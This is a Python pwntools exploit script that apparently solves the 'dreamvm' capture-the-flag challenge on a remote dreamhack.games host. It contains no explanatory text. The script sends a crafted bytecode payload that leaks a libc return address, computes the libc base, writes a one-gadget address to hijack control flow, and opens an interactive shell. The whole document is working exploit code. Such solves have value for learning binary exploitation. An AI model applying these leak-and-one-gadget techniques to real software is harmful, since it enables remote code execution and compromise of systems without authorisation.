#!/usr/bin/python3

from pwn import *

#p = process("./dreamvm")
p = remote("host1.dreamhack.games", 17851)
e = ELF("./dreamvm")
libc = ELF("./libc.so.6")

sa = lambda t, s: p.sendafter(t, s)
s = lambda s: p.send(s)
oneshot = [0x4f3d5, 0x4f432, 0x10a41c]

payload = p8(0x4)
payload += p64(0x10)
payload += p8(0x2) * 5
payload += p8(0x5)
payload += p8(0x6)
payload += p8(0x1)
payload += p8(0x41) * (0x100 - len(payload))

#sleep(0.5)
#pause()
s(payload)
ret = u64(p.recvn(8))
log.critical("__libc_start_main_ret: " + hex(ret))
_leaked_libc = ret - (libc.sym['__libc_start_main'] + 231) 
log.critical("libc base address: " + hex(_leaked_libc))
s(p64(_leaked_libc + oneshot[0]))

p.interactive()
